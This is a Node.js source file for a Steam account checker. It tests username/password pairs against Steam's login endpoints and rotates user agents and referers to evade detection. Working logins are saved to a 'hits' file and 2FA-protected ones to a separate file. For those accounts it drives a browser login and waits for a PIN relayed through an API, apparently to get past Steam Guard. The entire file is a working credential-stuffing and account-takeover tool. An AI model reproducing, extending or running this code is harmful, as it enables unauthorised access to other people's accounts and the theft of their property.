const fetch = require("node-fetch");
const NodeRSA = require("node-rsa");
const chalk = require("chalk");
const fs = require("fs");
const path = require("path");

const steamLogin = require("./login.js");

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
];

const referers = [
  "https://steamcommunity.com/",
  "https://store.steampowered.com/",
  "https://steamcommunity.com/login/home/?goto=",
];

const resultDir = path.join(__dirname, "../results");
if (!fs.existsSync(resultDir)) {
  fs.mkdirSync(resultDir);
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function getRandom(array) {
  return array[Math.floor(Math.random() * array.length)];
}

let pendingPinResolvers = {};

async function waitForPin(username) {
  console.log(
    chalk.blue(`🛑 Waiting for the PIN for [${username}] from API...`)
  );

  return new Promise((resolve) => {
    pendingPinResolvers[username] = resolve;
  });
}

function receivePinFromApi(username, pin) {
  console.log(`Received PIN: ${pin} for user: ${username}`);
  if (pendingPinResolvers[username]) {
    pendingPinResolvers[username](pin.trim());
    delete pendingPinResolvers[username];
  } else {
    console.error(`❗ No PIN request pending for user: ${username}.`);
  }
}

async function checkAccount(user, passw) {
  const userAgent = getRandom(userAgents);
  const referer = getRandom(referers);

  try {
    const session = fetch;

    const rsaResp = await session(
      "https://steamcommunity.com/login/getrsakey/",
      {
        method: "POST",
        headers: {
          "User-Agent": userAgent,
          "Content-Type": "application/x-www-form-urlencoded",
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "gzip, deflate, br",
          Accept: "*/*",
          Connection: "keep-alive",
          Origin: "https://steamcommunity.com",
          Referer: referer,
        },
        body: new URLSearchParams({
          username: user,
          donotcache: Date.now().toString(),
        }),
      }
    );

    if (rsaResp.status === 429) {
      console.log(
        chalk.red(`🚫 Rate limited on getrsakey for [${user}] — Waiting 60s...`)
      );
      await sleep(60000);
      return await checkAccount(user, passw);
    }

    const rsaData = await rsaResp.json();

    if (!rsaData.success) {
      console.log(chalk.red(`❌ Failed to get key for [${user}]`));
      return "failed_get_key";
    }

    const key = new NodeRSA();
    key.setOptions({ encryptionScheme: "pkcs1" });
    key.importKey(
      {
        n: Buffer.from(rsaData.publickey_mod, "hex"),
        e: parseInt(rsaData.publickey_exp, 16),
      },
      "components-public"
    );

    const encryptedPassword = key.encrypt(passw, "base64");

    const loginResp = await session(
      "https://steamcommunity.com/login/dologin/",
      {
        method: "POST",
        headers: {
          "User-Agent": userAgent,
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          Accept: "application/json, text/javascript, */*; q=0.01",
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "gzip, deflate, br",
          Origin: "https://steamcommunity.com",
          Referer: referer,
          Connection: "keep-alive",
        },
        body: new URLSearchParams({
          username: user,
          password: encryptedPassword,
          emailauth: "",
          loginfriendlyname: "",
          captchagid: "-1",
          captcha_text: "",
          emailsteamid: "",
          rsatimestamp: rsaData.timestamp,
          remember_login: "false",
          donotcache: Date.now().toString(),
        }),
      }
    );

    if (loginResp.status === 429) {
      console.log(chalk.red(`🚫 Rate limited on [${user}] — Waiting 60s`));
      await sleep(60000);
      return await checkAccount(user, passw);
    }

    const loginData = await loginResp.json();

    if (loginData.success) {
      console.log(chalk.green(`✅ Logged in successfully for [${user}]`));
      fs.appendFileSync(path.join(resultDir, "hit.txt"), `${user}:${passw}\n`);
      return "success";
    } else if (loginData.emailauth_needed) {
      console.log(chalk.yellow(`⚠️ 2FA Enabled — NEED VERIFY [${user}]`));
      fs.appendFileSync(path.join(resultDir, "2fa.txt"), `${user}:${passw}\n`);
      return "2fa_verified";
    } else {
      console.log(chalk.red(`❌ BAD ACCOUNT [${user}]`));
      return "bad_account";
    }
  } catch (err) {
    console.error(chalk.red(`❗ ERROR for [${user}]: ${err}`));
    return "error";
  }
}

async function startCheckingInternal(user, pass) {
  check = await checkAccount(user, pass);
  if (check === "2fa_verified") {
    await (async () => {
      const { browser, page } = await steamLogin.steamLogin(user, pass);
      console.log(
        chalk.yellow(`⏳ Waiting for PIN input from API for [${user}]...`)
      );

      const pinFromApi = await waitForPin(user);
      console.log("🚀 ~ await ~ pinFromApi:", pinFromApi);
      await steamLogin.submitPin(page, pinFromApi);

      console.log(chalk.green(`🎯 Finished 2FA for [${user}]`));
    })();
  }
  const delay = Math.floor(Math.random() * 5000) + 8000;
  console.log(chalk.blue(`⏳ Waiting ${delay / 1000}s`));
  await sleep(delay);
  console.log(chalk.green("✅ Semua akun telah selesai dicek."));
}

module.exports = { checkAccount, startCheckingInternal, receivePinFromApi };
